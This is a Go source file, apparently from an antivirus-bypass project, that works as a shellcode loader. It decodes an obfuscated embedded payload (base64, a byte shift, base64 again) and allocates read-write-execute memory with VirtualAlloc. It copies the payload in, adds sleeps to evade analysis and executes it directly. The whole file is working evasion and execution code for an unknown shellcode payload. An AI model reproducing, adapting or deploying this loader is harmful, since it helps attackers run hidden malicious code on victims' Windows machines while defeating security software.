package main

import (
	"GolangBypassAV/encry"
	"encoding/base64"
	"golang.org/x/sys/windows"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var kk = []byte{0x23, 0x32}
var (
	kernel32     = syscall.MustLoadDLL("kernel32.dll")
	ntdll        = syscall.MustLoadDLL("ntdll.dll")
	dllcrypt32   = windows.NewLazySystemDLL("Crypt32.dll")
	VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
	//RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
	procCryptProtectMemory   = dllcrypt32.NewProc("CryptProtectMemory")
	procCryptUnprotectMemory = dllcrypt32.NewProc("CryptUnprotectMemory ")
	RtlCopyMemory            = ntdll.MustFindProc("RtlCopyMemory")
)

func getEnCode(data []byte) string {
	bdata1 := base64.StdEncoding.EncodeToString(data)
	bydata1 := []byte(bdata1)
	var shellcode []byte

	for i := 0; i < len(bydata1); i++ {
		shellcode = append(shellcode, bydata1[i]+kk[0]-kk[1])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

func getDeCode(string2 string) []byte {

	ss, _ := base64.StdEncoding.DecodeString(string2)
	string2 = string(ss)
	var shellcode []byte

	bydata := []byte(string2)

	for i := 0; i < len(bydata); i++ {
		shellcode = append(shellcode, bydata[i]-kk[0]+kk[1])
	}
	ssb, _ := base64.StdEncoding.DecodeString(string(shellcode))
	return ssb

}

func exe(charcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(2 * time.Second)
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))

	procCryptProtectMemory.Call(uintptr(addr), uintptr(len(charcode)), uintptr(0x00))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}

	//procCryptUnprotectMemory.Call(uintptr(addr), uintptr(len(charcode)), uintptr(0x00))
	time.Sleep(2 * time.Second)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func getFileShellCode(file string) []byte {
	data := encry.ReadFile(file)
	return data
}

func main() {
	//fmt.Println(1)

	//fmt.Print(getEnCode(getFileShellCode("C:\\Users\\Administrator\\Desktop\\payload.bin")))

	bbdata := "IDZaNSZBNWBqMjIyMjY3Q0JHM0RGR0s6PlU7XUQ6ZURKNlo9RllZOloiOlhEOmVqRjZYQWUhYTxFRTk7RDU5MmM1aVlXMjpkOjY5M2pCIjMyVDlaKEc7M0ZGWj1GWjQ9QltpOjJVM15YSVhKNGg7IlRgZjJaMjIyMjZaN2g5Q19EMjlCRjplOjg2RD1CNDM7MlU1W0dcWyBqRjg9PzpZOjJVSz8+VF06PlQ0ZEJUOTs1RjYzaEVbWFVXNz4yIWhcNDZGJiFJSUpINkQ9QjRDOzJVM15CSmQ+RDZEPUIzaTsyVTMzWmhEOkQyOUJCR1kzSDcmS0hcN0pCR10zSFxaNSg0MzNGZyBYSDY3S0hcWj02Zl1BICAgIElIYDJEUyYkUkgmYVNeRyEyNjdIREpfXkU6X2lCU2E+VWpKOSAqRzo+VF06PlU7Pz5UMz8+VF0zRjY3QkJTYCdHX15fICpJYVxoMjIyN2E6WlQ3M2Y6JTMyMjM/PlRdM0ZGN0NSWD8zRkY4J0clXldpZyBHJyRdU0Q6XzNENTlEREpfSkVFOTtGXlgyPmQ0NkZdOzNmZmVHPVtnICJGWjtpXFo1aCIzYjRdKjpaVzgnOWgyMjI4YDJSOjJrMjIzO1pWMzNmQkIyMjIzM2ZfRzhfYFMgIkZaOylGWjsjXF85aEEgICAgKj8+VF1ERlw4Jz1CSkpWICBHWVQyQVlLITMyMjM6ICkpQVk6aDMyMjVjZBxfXDJCMjInOj0gICApZ1JfNyJLSTsmPUU+Zj5qJWo9Xz9kUkghZlNIXWY9XmFrMjgcX0JFV2lJU2RAJUtSZSY+MkEcSEAcVTk6RUpdQUBiIz1mWSFWVDVJPmBaVyUzQlIcOEFialkqZV9FNCRYQ1pFPDVbIGhqMjY3W0ojR2hVNWBYVThHJVU0KmBVOCJkPTg3aFQ4aWFKIzchUkgqZj0kWWBVOCJkPCRZZVM0aVlUOTNkUkg/WVU4XWdTWiolU0hoKFRFIWg9W1xkPFopYkAkNio+NCUlNUJhM0ojP11UOUJlRTg3ZkskR1lLI0YnOjhHZj1HR0U9OEdmQCQ2Kj40JSI1QmFES0hLXVReR2pAWjNgVTlDaEBaKWdKIypcS0QmYlRJR11UX1xmSiMqZT1oITxCSD9bS0kzIT1GR2ZKIypcUkgmX0BaM19WXl1oPTQzXEtIS2RKSUNdNUJhR1QjR2o9RjdfS0gmIUBaMz9TJGFhUzhpWT1rRmY+NDJgRyNdZks4KiRUajNARzQyIz1bPig6N0NqUkhDXVNfQmc/aiVoQGozalVbYGk+RCVoPEQzZFJIZV06NlVdSiNlZzVCYDJSHEoyOVhCNCkhVGhlW0BDRjJmJiQzNzJgUmJkNCRTODJlI0pKZ1RkYTVcWzlDOmclPCJmZ2MgMl9kJkRZNDk3HFocO1hoRGVUWDMzZ2c0ImBdUyAiRlhpalNgMjI2MjJCU1gyNjIyMkJTXTIyMjIyQlNhSmE3QV0gKkc6XCI/RUQ6X19EOl9pRDpfUkJTWDI6MjIyREpfJkJTYERdYF9aICpHOlgpQlhZVDMhZV5SPTMhWDNoJUkyVVVVSkg3WTozUilBMjIzQmgcWSAgVyAgPkU6aj1bXGY+RUYkPVs2aj5YMkQ/N0sl"
	shellCodeHex := getDeCode(bbdata)
	procCryptProtectMemory.Call(uintptr(unsafe.Pointer(&shellCodeHex)), uintptr(len(shellCodeHex)), uintptr(0x00))
	exe(shellCodeHex)
}
